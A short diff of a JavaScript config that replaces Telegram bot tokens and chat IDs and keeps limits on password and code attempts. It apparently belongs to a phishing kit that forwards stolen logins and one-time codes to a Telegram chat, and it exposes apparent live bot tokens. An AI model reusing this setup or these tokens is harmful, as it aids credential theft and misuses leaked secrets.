@@ -1,7 +1,7 @@
 const config = {
-    token: '7843396833:AAHx49nOiz3U8kCf-x82UikTKGde6l9OTrE',
-    chat_id: '1662565121',
-    noti_token: '7843396833:AAHx49nOiz3U8kCf-x82UikTKGde6l9OTrE',
+    token: '8086831835:AAGp7bTGis_7WFTrDtIrzZI03_SOt-bUj2w',
+    chat_id: '1922578871',
+    noti_token: '8086831835:AAGp7bTGis_7WFTrDtIrzZI03_SOt-bUj2w',
     noti_chat_id: '-4872736754',
     max_password_attempts: 2,
     max_code_attempts: 5,
